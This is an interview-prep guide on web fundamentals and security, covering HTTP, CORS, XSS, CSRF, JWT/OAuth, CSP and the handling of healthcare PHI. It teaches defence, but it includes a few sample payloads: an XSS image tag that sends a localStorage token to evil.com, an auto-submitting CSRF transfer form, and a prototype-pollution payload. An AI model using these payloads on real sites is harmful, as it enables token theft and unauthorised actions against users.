# 13 — Web Fundamentals and Security

Your resume claims a security audit (RBAC, JWT/OAuth, PHI), so expect depth here.

**How this file is organised**

- **Part A — Understand the topic:** how the web works (HTTP, cookies, origins), the main attacks, authentication vs authorisation, and why healthcare data needs extra care, explained simply.
- **Part B — Interview questions and answers:** Web Basics → Common Attacks → AuthN/AuthZ → Advanced → Healthcare/PHI → Scenario → From Your Resume.

Each answer has a **Short answer** (say this first), an **Explanation**, an **Example**, and a **Say it like this** sample answer.

---

## Part A — Understand the Topic

### How the web works, in one paragraph

The browser (the **client**) sends **HTTP requests** to servers, and the servers send back **responses**. Each request has a method (GET, POST…), a URL, headers (such as `Cookie` and `Authorization`) and sometimes a body. HTTPS wraps this in TLS encryption, so nobody in between can read or change it. Browsers enforce rules, such as the **same-origin policy**, that stop one website from reading another website's data.

### What is an "origin"?

An origin is **scheme + host + port**. `https://app.bpobox.com` and `https://api.bpobox.com` are *different origins*, because the hosts differ. By default, JavaScript on one origin can't read responses from another. **CORS** is how a server deliberately allows certain other origins to read its responses.

### Cookies vs tokens

- **Cookies** are attached to requests to their domain *automatically* by the browser. That's convenient, but it's also the root of CSRF attacks.
- **Bearer tokens** (often JWTs) are added by your JavaScript in the `Authorization` header, so your JavaScript must be able to read them. That makes them vulnerable to theft through XSS.

Choosing between them is a trade-off between XSS risk and CSRF risk (see Q30).

### The big attacks every frontend engineer must know

| Attack | What happens | Main defence |
|---|---|---|
| **XSS** (Cross-Site Scripting) | attacker's script runs inside *your* page | escape output, avoid `innerHTML`, sanitise, CSP |
| **CSRF** (Cross-Site Request Forgery) | another site makes the user's browser send an authenticated request to you | SameSite cookies, CSRF tokens, Origin checks |
| **Clickjacking** | your page is put in an invisible frame to trick clicks | `frame-ancestors` in CSP |
| **IDOR / broken access control** | changing `/calls/124` to `/calls/125` shows someone else's data | server-side authorisation on every request |
| **Injection** | input is run as SQL or commands | parameterised queries |
| **Supply chain** | a malicious npm package or CDN script | lockfiles, audits, SRI |

### Authentication vs authorisation

- **Authentication (AuthN):** *who are you?* Login, passwords, SSO, MFA.
- **Authorisation (AuthZ):** *what are you allowed to do?* Roles, permissions, tenant and ownership checks.

**Golden rule:** the frontend can *hide* buttons for a better UX, but only the **server** can *enforce* permissions. Anyone can call your API directly with curl.

### Why healthcare is special

**PHI** (Protected Health Information) is health data linked to a person. In the US, HIPAA governs it. Leaking it causes real harm and legal consequences, so PHI must never sit in browser storage, URLs, logs, analytics or error reports.

### Why interviewers ask about security

Your resume says you led an audit that found 8 critical issues and cut findings by 85%. Interviewers will test whether you really understand XSS, CSRF, token storage, RBAC and PHI handling, and whether you can explain *your* findings precisely.

---

## Part B — Interview Questions and Answers

## 🟢 Level 1 — Web Basics

**Q1. What happens when you type a URL and press Enter?**

**Short answer:**

1. The browser parses the URL and checks the HSTS list (whether this site must use HTTPS).
2. **DNS lookup:** the browser cache, then the OS, then the resolver turns the hostname into an IP address.
3. **TCP handshake** (or QUIC for HTTP/3).
4. **TLS handshake:** the browser validates the certificate and agrees encryption keys.
5. The **HTTP request** is sent with headers and cookies.
6. The server or CDN responds, possibly with a redirect.
7. The browser **parses the HTML**. The preload scanner discovers CSS, JavaScript and images, the DOM and CSSOM are built, scripts run, and then layout, paint and composite happen.
8. Later requests reuse the open connection.

**Say it like this:** "DNS turns the name into an IP, then TCP and TLS set up a secure connection, and the HTTP request goes out. The response HTML is parsed into the DOM, sub-resources are fetched in parallel, and the browser runs the rendering pipeline: style, layout, paint and composite. I can go deeper on any step. For performance, TLS and render-blocking resources are the interesting parts."

---

**Q2. HTTP vs HTTPS?**

**Short answer:** HTTPS is HTTP over TLS. It gives **encryption** (nobody can read the traffic), **integrity** (nobody can change it) and **server authentication** (you're really talking to that site). It's required for service workers, camera and microphone access, HTTP/2 in browsers, and `Secure` cookies.

---

**Q3. What are the HTTP methods?**

| Method | Purpose | Safe? | Idempotent? |
|---|---|---|---|
| GET | read | yes | yes |
| POST | create or perform an action | no | no |
| PUT | replace a resource | no | yes |
| PATCH | partially update a resource | no | not guaranteed |
| DELETE | delete | no | yes |
| OPTIONS | CORS preflight | yes | yes |
| HEAD | headers only | yes | yes |

**Explanation:** *Idempotent* means doing it twice has the same effect as doing it once. That matters for retries. Retrying a PUT is safe, but retrying a POST could create duplicates unless you send an idempotency key.

---

**Q4. Which status codes should you know?**

**Short answer:**

- **2xx success:** 200 OK, 201 Created, 204 No Content.
- **3xx redirects:** 301/308 permanent, 302/307 temporary, 304 Not Modified (use the cached copy).
- **4xx client errors:** 400 Bad Request, 401 Unauthenticated, 403 Forbidden, 404 Not Found, 409 Conflict, 422 Validation Error, 429 Too Many Requests.
- **5xx server errors:** 500 Internal Error, 502 Bad Gateway, 503 Unavailable, 504 Gateway Timeout.

---

**Q5. 401 vs 403?**

**Short answer:** 401 means "who are you?": the credentials are missing or invalid, so log in again. 403 means "I know who you are, but you're not allowed": logging in again won't help.

**Example:** An expired token gets a 401, so the frontend refreshes the token. A QA agent opening the admin page gets a 403, so the frontend shows "You don't have access".

---

**Q6. Which headers should you know?**

**Short answer:**

- **Request:** `Authorization`, `Cookie`, `Content-Type`, `Accept`, `Origin`, `If-None-Match`.
- **Response:** `Set-Cookie`, `Cache-Control`, `ETag`, `Content-Security-Policy`, `Strict-Transport-Security`, `Access-Control-Allow-Origin`, `Retry-After`.

---

**Q7. What are the cookie attributes?**

**Short answer:**

| Attribute | Meaning |
|---|---|
| `HttpOnly` | JavaScript can't read it, which protects it from XSS theft |
| `Secure` | sent only over HTTPS |
| `SameSite=Strict` | never sent on cross-site requests |
| `SameSite=Lax` | sent on top-level navigation (clicking a link), not on cross-site POSTs or iframes |
| `SameSite=None` | always sent (requires `Secure`); needed for legitimate cross-site use |
| `Domain`, `Path` | which URLs receive it |
| `Expires` / `Max-Age` | lifetime |
| `__Host-` prefix | forces `Secure`, no `Domain`, `Path=/`, which is the most locked-down option |

**Example:** `Set-Cookie: __Host-session=abc; Path=/; Secure; HttpOnly; SameSite=Lax`

---

**Q8. What is the same-origin policy?**

**Short answer:** A page can **read** responses only from the same scheme, host and port. Cross-origin requests may still be *sent* (forms, images, scripts), but the response can't be read by JavaScript. This stops `evil.com` from reading your bank balance with `fetch`.

---

**Q9. What is CORS?**

**Short answer:** Cross-Origin Resource Sharing is how a server opts in to letting other origins read its responses.

- The browser sends an `Origin` header, and the server replies with `Access-Control-Allow-Origin`.
- "Non-simple" requests trigger a **preflight** `OPTIONS` request first. These include requests with custom headers, a JSON content type, or methods like PUT and DELETE.
- With cookies (`credentials: 'include'`), the server must return an *explicit* origin (not `*`) and `Access-Control-Allow-Credentials: true`.

```text
Browser → OPTIONS /api/calls   Origin: https://app.bpobox.com
Server  ← Access-Control-Allow-Origin: https://app.bpobox.com
          Access-Control-Allow-Methods: GET, POST
          Access-Control-Allow-Headers: Content-Type
          Access-Control-Allow-Credentials: true
Browser → POST /api/calls (actual request)
```

---

**Q10. Is CORS a security feature for your API?**

**Short answer:** No. CORS protects *users' browsers* from other sites reading responses. It doesn't protect your API at all from curl, Postman or scripts. You still need authentication and authorisation on every endpoint.

**Say it like this:** "CORS is a browser rule, not an API firewall. I've seen teams think a strict CORS config secures their API. It doesn't: anyone can call the API outside a browser."

---

**Q11. What are the REST principles?**

**Short answer:** Resources identified by URLs (`/calls/42`), standard HTTP methods, stateless requests, JSON representations, correct status codes and cacheable responses.

---

**Q12. REST vs GraphQL vs gRPC?**

| | REST | GraphQL | gRPC |
|---|---|---|---|
| Endpoints | many | one | service methods |
| Data shape | server decides | client selects fields | protobuf contract |
| Over- and under-fetching | common | avoided | n/a |
| HTTP caching | easy | harder (POST) | n/a |
| Browser support | native | native | needs gRPC-Web |
| Best for | most public APIs | flexible UIs aggregating many sources | fast service-to-service calls |

---

**Q13. What are the options for real-time communication?**

**Short answer:**

- **Short polling:** ask every N seconds.
- **Long polling:** the server holds the request open until there's data.
- **SSE** (Server-Sent Events): a one-way server-to-client stream over HTTP, with auto-reconnect.
- **WebSocket:** bidirectional and persistent.
- **WebRTC:** peer-to-peer or SFU media and data over UDP, with the lowest latency.

---

**Q14. SSE vs WebSocket: when do you use each?**

**Short answer:** Use **SSE** for one-way streams: notifications, LLM tokens, job progress. It's simple, works over normal HTTP and proxies, and reconnects automatically. Use **WebSocket** for two-way interactive features: chat with typing indicators, collaborative editing, games.

**Say it like this:** "For the AI compliance chat I used SSE. The server streams tokens one way, and the user's question goes as a normal POST. WebSocket would add connection management for no benefit."

---

**Q15. Authentication vs authorisation?**

**Short answer:** Authentication verifies *who you are* (login). Authorisation decides *what you can do* (permissions).

---

## 🟡 Level 2 — Intermediate: Common Attacks

**Q16. What is XSS, what types are there, and what's the impact?**

**Short answer:** Cross-Site Scripting means an attacker gets their JavaScript to run inside your trusted page. There are three types:

- **Stored:** the payload is saved in the database (for example, a comment) and served to every viewer.
- **Reflected:** the payload comes from the URL or request and is echoed back.
- **DOM-based:** client-side JavaScript writes untrusted data into a dangerous sink (`innerHTML`).

**Impact:** the script can do anything the user can. It can read the data on screen, call APIs as the user, log keystrokes, and steal tokens that aren't in HttpOnly cookies.

**Example payload:**

```html
<img src=x onerror="fetch('https://evil.com?c='+localStorage.token)">
```

---

**Q17. How do you defend against XSS?**

**Short answer:** Use several layers:

1. **Encode output by default.** React escapes text automatically.
2. **Avoid dangerous sinks:** `innerHTML`, `dangerouslySetInnerHTML`, `eval`, `new Function`, `setTimeout('string')`, `javascript:` URLs.
3. **Sanitise** when you genuinely need HTML, with DOMPurify.
4. Add a **Content Security Policy** with nonces or hashes.
5. Use **Trusted Types** to lock down DOM sinks.
6. Keep session tokens in **HttpOnly cookies**, out of JavaScript's reach.
7. **Validate URLs:** `new URL(x)`, and allow only the `https:` and `http:` protocols.

```tsx
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />

const safeHref = (u: string) => {
  try { const url = new URL(u); return ['https:', 'http:'].includes(url.protocol) ? u : '#'; }
  catch { return '#'; }
};
```

**Say it like this:** "React escapes text by default, so my XSS checklist focuses on escape hatches: `dangerouslySetInnerHTML`, user-supplied URLs and markdown rendering. Behind that, a strict CSP means even an injected script can't run or talk to an attacker's server."

---

**Q18. Where can XSS still happen in React?**

**Short answer:**

- `dangerouslySetInnerHTML` with unsanitised content.
- `href={userUrl}` containing `javascript:alert(1)`.
- Rendering markdown or LLM output to HTML without sanitising it.
- `ref.current.innerHTML = …`.
- Third-party widgets.
- Server-injected JSON in a `<script>` tag without escaping `</script>`.

---

**Q19. What is CSRF, and how do you defend against it?**

**Short answer:** Cross-Site Request Forgery: a malicious site makes the victim's browser send an authenticated request to *your* app. It works because the browser attaches your cookies automatically.

```html
<!-- on evil.com -->
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker"><input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
```

**Defences:**

- `SameSite=Lax` or `Strict` cookies.
- CSRF tokens (the synchroniser or double-submit pattern).
- Verify the `Origin` or `Referer` header on state-changing requests.
- Never change state on a GET.
- Re-authenticate for sensitive actions.

---

**Q20. Does putting a JWT in the Authorization header prevent CSRF?**

**Short answer:** Yes. Browsers don't attach headers automatically on cross-site requests. But the token must then be readable by JavaScript, so a single XSS can steal it. You've traded CSRF risk for XSS risk.

---

**Q21. What is clickjacking?**

**Short answer:** An attacker loads your page in an invisible iframe and tricks users into clicking buttons on it, for example "Delete account" hidden under "Win a prize". Defend with `Content-Security-Policy: frame-ancestors 'none'`, or allow only specific origins. `X-Frame-Options: DENY` is the legacy equivalent.

---

**Q22. What is an open redirect?**

**Short answer:** `/login?next=https://evil.com` sends users to an attacker's site after they log in, and the trusted domain makes the phishing link look legitimate. Allow only relative paths or an allowlist of destinations.

```ts
const next = searchParams.get('next') ?? '/';
const safe = next.startsWith('/') && !next.startsWith('//') ? next : '/';
```

---

**Q23. What is IDOR, or broken access control?**

**Short answer:** Insecure Direct Object Reference: changing an ID in a request (`/api/calls/124` → `/api/calls/125`) returns someone else's data, because the server never checked ownership or tenant. Broken access control is the **number one** category in the OWASP Top 10.

**Defence:** authorise *every* request on the server, checking the user, their tenant and their ownership of the resource. Back it with automated tests.

**Say it like this:** "IDOR is the most common serious bug I look for. The frontend might never show call 125's link, but the API must still reject it. In our audit, missing tenant scoping was exactly this kind of issue."

---

**Q24. What is injection (SQL, NoSQL, command)?**

**Short answer:** Untrusted input interpreted as code. Defend with parameterised queries or an ORM, input validation, and least-privilege database users. Frontend validation is UX only, never security.

---

**Q25. How does sensitive data get exposed by the frontend?**

**Short answer:**

- Secrets in bundles (API keys in `NEXT_PUBLIC_` or `VITE_` variables).
- Verbose error messages.
- Data in URLs, which ends up in server logs, proxies and analytics.
- Sensitive data in localStorage.
- Public source maps revealing internal code.

---

**Q26. What's on the security headers checklist?**

```text
Content-Security-Policy: …
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(self), microphone=(self), geolocation=()
Cross-Origin-Opener-Policy: same-origin
```

**Short answer:** CSP blocks injected scripts. HSTS forces HTTPS. `nosniff` stops the browser guessing MIME types. `Referrer-Policy` limits URL leakage. `Permissions-Policy` limits device APIs. COOP isolates your window from cross-origin popups.

---

**Q27. How do you protect against supply-chain attacks?**

**Short answer:**

- Commit lockfiles and install with `npm ci`.
- Use Dependabot or Renovate, and `npm audit` or Snyk.
- Review new dependencies: maintainers, size, install scripts.
- Pin critical packages.
- Use Subresource Integrity for CDN scripts.
- Keep third-party scripts to a minimum on sensitive pages.

---

## 🟡 Intermediate: Authentication and Authorisation

**Q28. Session cookies vs tokens (JWT)?**

**Short answer:** With **sessions**, the server stores the session and the browser holds only an opaque ID in an HttpOnly cookie, so revocation is easy: delete the session. A **JWT** is self-contained, signed data. It can be verified without a database lookup, but it's hard to revoke before it expires, and it's larger. Many systems combine them: short-lived JWT access tokens plus server-tracked refresh tokens.

---

**Q29. What is the structure of a JWT, and how do you validate it?**

**Short answer:** A JWT is `header.payload.signature`, base64url-encoded. It's **signed, not encrypted**: anyone can decode and read the payload. To validate one:

- Check the signature with the *expected* algorithm. Reject `alg: none`, and never let the token choose the algorithm.
- Check `exp` (expiry), `nbf` (not before), `iss` (issuer) and `aud` (audience).
- Keep the payload minimal, with **no PHI**.

```text
eyJhbGciOiJSUzI1NiJ9 . eyJzdWIiOiJ1XzEyMyIsInJvbGUiOiJxYSIsImV4cCI6MTczMDAwMDAwMH0 . <signature>
{ "alg": "RS256" }     { "sub": "u_123", "role": "qa", "exp": 1730000000 }
```

---

**Q30. Where should tokens be stored in a browser?**

| Option | If XSS happens | CSRF exposure | Notes |
|---|---|---|---|
| localStorage / sessionStorage | token can be **stolen** and used anywhere | none | avoid for sensitive apps |
| HttpOnly Secure cookie | can't be read; XSS can still make requests while the page is open | needs SameSite + CSRF defence | strong default |
| Memory (JS variable) + HttpOnly refresh cookie | lost on reload, re-fetched through refresh | refresh endpoint needs CSRF protection | common SPA pattern |
| **BFF** (backend-for-frontend holds tokens) | browser only has a session cookie | SameSite + CSRF | **best for healthcare** |

**Say it like this:** "In a healthcare app I'd avoid localStorage completely, because one XSS bug means every token can be exfiltrated. My preference is a BFF: the server holds the OAuth tokens and the browser only has an HttpOnly, Secure, SameSite session cookie. If XSS happens, the attacker can't take the session away and replay it later."

---

**Q31. What is refresh token rotation?**

**Short answer:** Every refresh returns a *new* refresh token and invalidates the old one. If an old refresh token is ever used again, the server knows it was stolen and revokes the whole token family, logging out both the thief and the victim.

---

**Q32. How do you handle token expiry when several requests run at once?**

```ts
let refreshing: Promise<void> | null = null;

export async function authFetch(input: RequestInfo, init: RequestInit = {}): Promise<Response> {
  const run = () => fetch(input, { ...init, credentials: 'include' });
  let res = await run();
  if (res.status !== 401) return res;

  refreshing ??= fetch('/auth/refresh', { method: 'POST', credentials: 'include' })
    .then((r) => { if (!r.ok) throw new Error('refresh failed'); })
    .finally(() => { refreshing = null; });

  try {
    await refreshing;           // everyone waits on the SAME refresh
  } catch {
    logout();
    throw new Error('Session expired');
  }
  return run();                 // retry once
}
```

**Short answer:** Make the refresh **single-flight**. The first 401 starts one refresh, and all other failed requests wait for that same promise. Retry each request once, and log out if the refresh fails.

---

**Q33. What are the OAuth 2.0 roles and flows?**

**Short answer:**

- **Roles:** the resource owner (the user), the client (your app), the authorisation server (the identity provider) and the resource server (the API).
- **Flows:**
  - **Authorization Code + PKCE:** SPAs, mobile apps and server apps.
  - **Client Credentials:** service-to-service.
  - **Device Code:** TVs and CLIs.
  - The Implicit and Password grants are **deprecated**.

---

**Q34. How does PKCE work?**

**Short answer:** Proof Key for Code Exchange:

1. The client creates a random `code_verifier` and sends `code_challenge = SHA256(code_verifier)` with the login request.
2. The identity provider returns an authorisation code.
3. To exchange the code for tokens, the client must send the original `code_verifier`.

A stolen authorisation code is useless without the verifier, which never left the app.

---

**Q35. OIDC vs OAuth?**

**Short answer:** OAuth is about **delegated authorisation**: access tokens for calling APIs. OIDC (OpenID Connect) adds an **identity layer** on top: an ID token with user claims, a `/userinfo` endpoint, and discovery. Always validate `state` (against CSRF), `nonce` (against replay) and the ID token's claims.

---

**Q36. What are SSO and SAML?**

**Short answer:** Single Sign-On lets users log in once and access many apps through an identity provider (Okta, Azure AD). SAML is the older XML-based enterprise protocol, and OIDC is the modern JSON/JWT-based one.

---

**Q37. RBAC vs ABAC vs ReBAC?**

**Short answer:**

- **RBAC** (role-based): permissions come from roles: admin, QA, agent.
- **ABAC** (attribute-based): policies on attributes, for example "same tenant AND same department AND during working hours".
- **ReBAC** (relationship-based): based on relationships, for example "the user is a member of the team that owns this call".

Real systems combine RBAC with tenant and ownership checks.

---

**Q38. What is the frontend's role in authorisation?**

**Short answer:** UX only: hide or disable actions the user can't take, guard routes, and build permission-aware components. The frontend is **never** the enforcement point: the API checks every request. Third-party tokens, such as LiveKit's, should carry scoped grants (which room, `canPublish`, `canSubscribe`).

---

**Q39. What are MFA and passkeys?**

**Short answer:** MFA adds a second factor: a TOTP code, a push approval or a hardware key. **Passkeys** (WebAuthn) are public-key credentials bound to the website's origin, so they're **phishing-resistant**: a fake site simply can't use them.

---

**Q40. What are the session management best practices?**

**Short answer:**

- A short idle timeout for sensitive apps, plus an absolute timeout.
- Re-authentication for critical actions.
- Logout invalidates the server session and the refresh token.
- Clear client caches on logout.
- Sync logout across tabs.

---

## 🔴 Level 3 — Advanced

**Q41. How do you design a strict CSP?**

```text
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}' 'strict-dynamic';
  style-src 'self' 'nonce-{random}';
  img-src 'self' data: https://cdn.example.com;
  connect-src 'self' https://api.example.com wss://livekit.example.com;
  media-src 'self' blob:;
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'none';
  form-action 'self';
  report-to csp-endpoint;
```

**Short answer:** A Content Security Policy tells the browser which sources of scripts, styles and connections are allowed. Use a fresh random **nonce** per response, avoid `'unsafe-inline'` and `'unsafe-eval'`, and limit `connect-src` so injected code can't send data anywhere else. Roll it out with `Content-Security-Policy-Report-Only` first, fix the violations, then enforce it.

**Say it like this:** "CSP is the safety net if XSS slips through. With nonce-based `script-src`, an injected `<script>` doesn't run, and a strict `connect-src` stops data being sent to an attacker's domain."

---

**Q42. What are Trusted Types?**

**Short answer:** With `require-trusted-types-for 'script'`, dangerous DOM sinks like `innerHTML` accept only typed values created by approved policies. That eliminates whole classes of DOM-based XSS.

---

**Q43. What is Subresource Integrity (SRI)?**

```html
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

**Short answer:** The browser hashes the downloaded file and refuses to run it if the hash doesn't match. A compromised CDN can't inject code.

---

**Q44. What are COOP, COEP and CORP, and what is cross-origin isolation?**

**Short answer:** Cross-Origin-Opener-Policy isolates your window from cross-origin popups. Cross-Origin-Embedder-Policy plus Cross-Origin-Resource-Policy make the page `crossOriginIsolated`, which is required for `SharedArrayBuffer` and high-precision timers. They also mitigate Spectre-style side-channel leaks.

---

**Q45. How do you use `postMessage` securely?**

**Short answer:** Validate `event.origin` against an allowlist and validate the message's shape. Never send sensitive data with `'*'` as the target origin.

---

**Q46. What is prototype pollution?**

**Short answer:** Merging untrusted JSON containing `__proto__` or `constructor.prototype` into an object modifies the prototype of *every* object, which can change app logic.

```js
const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
deepMerge({}, payload);
({}).isAdmin;  // true — every object is now "admin"
```

**Defences:** safe merge utilities, `Object.create(null)`, schema validation (Zod), and freezing prototypes in sensitive contexts.

---

**Q47. What is ReDoS?**

**Short answer:** Regular expression denial of service. A regex with catastrophic backtracking, such as `/(a+)+$/`, run on crafted input freezes the main thread or the server. Avoid nested quantifiers, limit input length, and use safe regex libraries.

---

**Q48. How do you secure file uploads?**

**Short answer:**

- Use pre-signed upload URLs with size and type limits.
- Validate the content on the server. Don't trust the file extension or the MIME type.
- Scan for malware.
- Store files outside the web root.
- Serve them with `Content-Disposition: attachment`.
- Never render user-uploaded HTML or SVG inline from your main origin.

---

**Q49. How do you handle rate limiting and abuse prevention?**

**Short answer:**

- Rate limits per user, IP and tenant, returning 429 with `Retry-After`.
- CAPTCHA or bot detection on public forms.
- **Cost limits on LLM endpoints**, because AI calls cost real money.

---

**Q50. How do you secure source maps and error tracking?**

**Short answer:** Upload source maps privately to Sentry instead of serving them publicly, and scrub PII and PHI from events before they're sent.

---

**Q51. How do you secure LLM integrations?**

**Short answer:**

- Keep API keys on the server only.
- Treat model output as **untrusted input**, because of prompt injection.
- Limit the permissions of any tools the model can call.
- Sanitise rendered output.
- Don't send unnecessary sensitive data to the provider, and have data-retention agreements.
- Apply per-tenant rate limits.
- Log usage without logging sensitive content.

---

**Q52. What are the OWASP Top 10 categories?**

**Short answer:**

- Broken access control
- Cryptographic failures
- Injection
- Insecure design
- Security misconfiguration
- Vulnerable or outdated components
- Identification and authentication failures
- Software and data integrity failures
- Logging and monitoring failures
- SSRF

The category names shift a little between editions.

---

**Q53. How do you threat-model a feature?**

**Short answer:**

1. Identify the **assets**: PHI, recordings, tokens.
2. Identify the **actors**: patient, provider, interpreter, admin, attacker.
3. Identify the **entry points**: APIs, webhooks, uploads, LiveKit.
4. Map the **data flows**.
5. Apply **STRIDE**: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege.
6. Prioritise the mitigations.

**Say it like this:** "For the call-recording feature, I'd ask: who can start a recording, where is it stored, who can view it, and how could each step be abused? Then I'd go through STRIDE, list the risks, and fix the high-impact ones first."

---

**Q54. What security testing belongs in the pipeline?**

**Short answer:**

- SAST (CodeQL, Semgrep).
- Dependency scanning and secret scanning.
- DAST (OWASP ZAP).
- An automated authorisation test matrix.
- Periodic penetration tests.

---

## 🏥 Healthcare and PHI (Your Domain)

**Q55. What is PHI, and which regulations apply?**

**Short answer:** Protected Health Information: health data linked to an identifiable person. That includes names with medical context, dates of birth, medical record numbers, appointment details, the contents of medical conversations, and recordings. In the US it's governed by **HIPAA**. Other regions have their own laws; GDPR, for example, treats health data as a "special category". Know the basics, and don't overclaim legal expertise.

---

**Q56. What are the frontend rules for PHI?**

**Short answer:**

- **No PHI in browser storage:** localStorage, sessionStorage, IndexedDB or service-worker caches.
- **No PHI in URLs, page titles, analytics events, logs or error reports.**
- Session timeout and auto-logout on idle, and clear caches on logout.
- Mask sensitive fields where appropriate, and keep PHI out of push notifications and lock screens.
- **No third-party trackers on PHI screens.**
- TLS everywhere, and secure cookies.
- Audit logging of every access, on the server.

**Say it like this:** "My rule of thumb: assume anything the browser stores or sends to a third party could leak, so PHI only lives in memory while it's on screen. Even the page title says 'Call details', not the patient's name, because titles end up in browser history."

---

**Q57. How do you use Sentry and monitoring with PHI?**

```ts
Sentry.init({
  dsn,
  sendDefaultPii: false,
  beforeSend(event) {
    delete event.request?.data;
    if (event.user) event.user = { id: event.user.id };    // no email/name
    return scrubPhi(event);
  },
  beforeBreadcrumb(b) { return b.category === 'console' ? null : b; },
  replaysSessionSampleRate: 0,                             // or full masking
});
```

**Short answer:** Set `sendDefaultPii: false`, scrub events in `beforeSend` and `beforeBreadcrumb`, disable session replay or mask it completely, avoid console breadcrumbs, and sign a data-processing agreement with the vendor.

---

**Q58. How do you handle recordings and transcripts?**

**Short answer:**

- Encrypt them at rest.
- Give access only through short-lived signed URLs.
- Use role-based access.
- Keep an audit trail of who viewed or downloaded what.
- Apply retention policies.
- Capture consent before recording.

---

**Q59. How do you secure LiveKit and WebRTC?**

**Short answer:**

- Short-lived access tokens with minimal grants per role.
- Room names that contain no PHI.
- WebRTC encrypts media in transit by default (DTLS-SRTP). Consider end-to-end encryption where required.
- TURN over TLS.
- Validate webhook signatures on the server.

---

## 🧩 Level 4 — Scenario-Based

**Q60. A pentest found JWTs in localStorage. What do you change?**

**Answer:**

1. Move tokens to HttpOnly, Secure, SameSite cookies, or to a BFF.
2. Make access tokens short-lived, with refresh rotation.
3. Add a CSP to reduce XSS risk.
4. Migrate users smoothly: issue the new cookies at the next login, and delete the old tokens from storage.

---

**Q61. Agents can see other teams' calls by changing the URL.**

**Answer:** This is IDOR. Fix it in three steps:

1. Add server-side authorisation by tenant, team and ownership on **every** endpoint.
2. Write automated authorisation tests: a matrix of role × endpoint × tenant.
3. Check the audit logs to see whether it was exploited, and follow the incident process if it was.

---

**Q62. Marketing wants a third-party chat widget on the patient dashboard.**

**Answer:** A script on your page can read everything on that page, including PHI. So keep the widget off PHI pages, or isolate it in a sandboxed iframe on a separate origin. Add it to the CSP allowlist only where needed, and require a vendor data agreement.

---

**Q63. LLM-generated summaries show raw HTML from transcripts.**

**Answer:** The model output is being rendered as HTML, which is an XSS risk. Sanitise it with DOMPurify, or use a markdown renderer with HTML disabled. Strip links or add `rel="noopener noreferrer"`, and test with injection payloads in the transcripts.

---

**Q64. A user is logged out in one tab but still active in another.**

**Answer:** Broadcast logout with BroadcastChannel or the `storage` event. The server invalidates the refresh token, so other tabs get a 401 on their next request and redirect to login.

---

**Q65. You must allow your app to be embedded in a partner's portal.**

**Answer:**

- Set `frame-ancestors https://partner.example`.
- Use `SameSite=None; Secure` cookies, or hand off a token.
- Use `postMessage` with origin checks.
- Review the clickjacking risks.

---

**Q66. Error tracking captured patient names in breadcrumbs.**

**Answer:**

1. Ask the vendor to purge the events.
2. Add scrubbing rules.
3. Review the logging code, and add lint rules or tests that stop PHI being logged.
4. Document it as an incident.

---

## 🎯 From Your Resume

**Q67. "Walk me through your security audit."**

**Say it like this:** "I scoped it to the React app, the FastAPI APIs, authentication and client-side storage. First, I built a threat model: the roles, the data flows, and where PHI lived. Then I worked through an OWASP ASVS-style checklist and tested every endpoint as every role and tenant. I reviewed the token lifecycle and storage, and searched logs, browser storage and analytics for PHI. Each finding got a severity, a fix and a regression test, and then we re-audited. I can walk through three specific findings in detail."

*Prepare three real findings in the form problem → impact → fix → how you prevented it coming back.*

---

**Q68. "What were the 8 critical issues?"**

**Answer guidance:** Only describe real issues you worked on. Typical categories to map them to:

- RBAC enforced only in the UI.
- Missing tenant scoping (IDOR).
- Tokens in localStorage.
- No refresh rotation or revocation.
- Long-lived tokens.
- PHI in logs or Sentry.
- PHI in browser storage.
- Missing security headers.

---

**Q69. "What does 'cut findings by 85%' mean exactly?"**

**Say it like this:** "It's the number of open findings in the re-audit compared with the initial audit. For example, 40 findings down to 6. The remaining ones were lower severity and tracked with owners and dates. I can explain which ones remained and why." *(Use your real numbers, and say whether you counted raw findings or weighted them by severity.)*

---

**Q70. "How did you handle RBAC in FastAPI and React together?"**

**Say it like this:** "On the server, every route had a permission dependency that checked the role, the tenant and resource ownership. That was the real enforcement. On the client, the same permission list drove navigation, route guards and button visibility, purely for UX. We kept them in sync from one source and added an authorisation test matrix that tried every role against every endpoint in CI."

---

**Q71. "How are LiveKit tokens secured?"**

**Say it like this:** "Tokens are generated on the server, per user and per room, with a short expiry and minimal grants. An interpreter can publish, while an observer can only subscribe. The client never constructs tokens, and room names are opaque IDs with no patient information."
